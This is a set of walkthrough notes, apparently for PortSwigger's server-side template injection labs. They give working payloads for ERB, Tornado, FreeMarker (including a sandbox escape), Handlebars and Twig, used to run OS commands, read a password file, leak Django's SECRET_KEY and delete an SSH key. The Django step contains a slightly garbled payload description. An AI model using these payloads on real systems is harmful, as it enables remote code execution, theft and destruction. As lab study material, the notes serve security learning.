# Server-side Template Injection
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

## Detect
Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.

### LAB: Basic server-side template injection
Click on the first product. Notice there is a text indicating the stock status of this product which is getting from this parameter in the URL:

    ?message=Unfortunately%20this%20product%20is%20out%20of%20stock

Try changing it to something arbitrary:

    ?message=<%a%>

We got an internal server error indicating the template it used is `ERB`. Try a valid `ERB` template syntax:

    ?message=<%`ls -l`%>

This is an OS command showing the content of the current directory. The server is returning us:

    total 8
    -rw-rw-r-- 1 carlos carlos 6816 Mar 12 02:16 morale.txt

This indicates that we can successfully inject OS command into the server side template engine. Use this to delete the target file:

    /?message=<%= `rm morale.txt` %>

### LAB: Basic server-side template injection (code context)
Notice the `POST /my-account/change-blog-post-author-display HTTP/2` request which use:

    blog-post-author-display=user.first_name

This indicates that the server might be using some kind of template engine. Try fuzzing the value to this:

    blog-post-author-display=${{<%[%'"}}%\

Post a comment and visit that comment again to find an error indicating that the server is using `Tornado` template in Python. Resend the request using this parameter:

    blog-post-author-display=__import__('os').popen('ls+-l').read()

Visit the comment and find out that the command is executed and returned as the author's name"

    total 8 -rw-rw-r-- 1 carlos carlos 6816 Mar 12 02:34 morale.txt

Resend the request using this parameter to successfully delete the target file:

    blog-post-author-display=__import__('os').popen('rm+morale.txt').read()

### LAB: Server-side template injection using documentation
Use the `Edit template` function in any product page. Try adding `${a}` to template and click `Preview`. The server is returning us an error indicating the template it is using is `freenmarker` in Java.
Now inject this to the template:

    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -l") }

Notice the result of the OS command `ls -l` is shown in the preview indicating a successful SSTI. Now inject this to delete the target file:

    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm morale.txt") }

To understand the payload, read more at [SSTI Portswigger Research](https://portswigger.net/research/server-side-template-injection) (in FreeMarker section).

### LAB: Server-side template injection in an unknown language with a documented exploit
Click on the first product. Notice there is a text indicating the stock status of this product which is getting from this parameter in the URL:

    ?message=Unfortunately%20this%20product%20is%20out%20of%20stock

Try changing it to something arbitrary:

    ?message=${{<%[%'"}}%\

The server is giving us an error indicating that it is using `Handlebars.js` as a template engine. Search online for Handlebars SSTI exploit and found this at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md#handlebars):

    {{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').execSync('ls -la');"}}
                {{this.pop}}
                {{#each conslist}}
                {{#with (string.sub.apply 0 codelist)}}
                    {{this}}
                {{/with}}
                {{/each}}
            {{/with}}
            {{/with}}
        {{/with}}
    {{/with}}

Try sending it as the value of `message`, we got the response from the server indicating a successfull SSTI attack. Now submit this to remove the target file:

    {{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').execSync('rm morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                {{#with (string.sub.apply 0 codelist)}}
                    {{this}}
                {{/with}}
                {{/each}}
            {{/with}}
            {{/with}}
        {{/with}}
    {{/with}}

### LAB: Server-side template injection with information disclosure via user-supplied objects
Use the edit template function and try sending arbitrary values: `{{7*7}}`. The server responses with an error indicating it is using `Django` as a template engine. 
This time send `{{settings.SECRET_KEY}}`. The response is `True`, then debug mode is enabled, which can expose sensitive information.
Now send `{{ settings.SECRET_KEY }}` which right away return the framework's key.

### LAB: Server-side template injection in a sandboxed environment
Use the edit template function and try sending arbitrary values: `${sth}`. The server responses with an error indicating it is using `Freemarker` as a template engine.
Use this payload to escape sandbox and execute the OS command `ls -l`:

    <#assign classloader=article.class.protectionDomain.classLoader>
    <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
    <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
    <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
    ${dwf.newInstance(ec,null)("ls -l")}

Notice that the server is indicating that `article` is `null`. But we do have access to the class `product`. Replace `article` with `product` to successfully execute the command. The response indicates that there is a file called `my_password.txt` in Carlos' home directory. This time use this payload to view the content of the file:

    <#assign classloader=product.class.protectionDomain.classLoader>
    <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
    <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
    <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
    ${dwf.newInstance(ec,null)("cat my_password.txt")}

### LAB: Server-side template injection with a custom exploit
First try upload any arbitrary file that is not an image. We will get an error showing us some useful information:
- An object called `User` which has a function called setAvatar($filename, $mimetype)
- A `User.php` file at `/home/carlos/User.php`

Next, try changing the preferred name, notice this suspicious value used in the `POST /my-account/change-blog-post-author-display` request:

    blog-post-author-display=user.first_name

This `user.firstname` is reflected in the post page where we post a comment. Try:

    blog-post-author-display=user

We got an error indicating that the server is using `Twig` as a template engine and has a class called `User` just like from the earlier error message. Try use the `setAvatar()` function to view the `User.php` file:

    blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/png')

Reload the post page where we post a comment and visit image address to see the `User.php` content:

    <?php

    class User {
        public $username;
        public $name;
        public $first_name;
        public $nickname;
        public $user_dir;

        public function __construct($username, $name, $first_name, $nickname) {
            $this->username = $username;
            $this->name = $name;
            $this->first_name = $first_name;
            $this->nickname = $nickname;
            $this->user_dir = "users/" . $this->username;
            $this->avatarLink = $this->user_dir . "/avatar";

            if (!file_exists($this->user_dir)) {
                if (!mkdir($this->user_dir, 0755, true))
                {
                    throw new Exception("Could not mkdir users/" . $this->username);
                }
            }
        }

        public function setAvatar($filename, $mimetype) {
            if (strpos($mimetype, "image/") !== 0) {
                throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
            }

            if (is_link($this->avatarLink)) {
                $this->rm($this->avatarLink);
            }

            if (!symlink($filename, $this->avatarLink)) {
                throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
            }
        }

        public function delete() {
            $file = $this->user_dir . "/disabled";
            if (file_put_contents($file, "") === false) {
                throw new Exception("Could not write to " . $file);
            }
        }

        public function gdprDelete() {
            $this->rm(readlink($this->avatarLink));
            $this->rm($this->avatarLink);
            $this->delete();
        }

        private function rm($filename) {
            if (!unlink($filename)) {
                throw new Exception("Could not delete " . $filename);
            }
        }
    }

    ?>

Study the script, we notice that when we set the avatar to `/home/carlos/.ssh/id_rsa` and call the `gdprDelete()` function, we will be able to delete `.ssh/id_rsa`. To do so, first set the avatar using:

    blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')

Reload the post page for this to be evaluated. Next call the delete function:

    blog-post-author-display=user.gdprDelete()

Reload the post page and we successfully deleted `.ssh/id_rsa`.
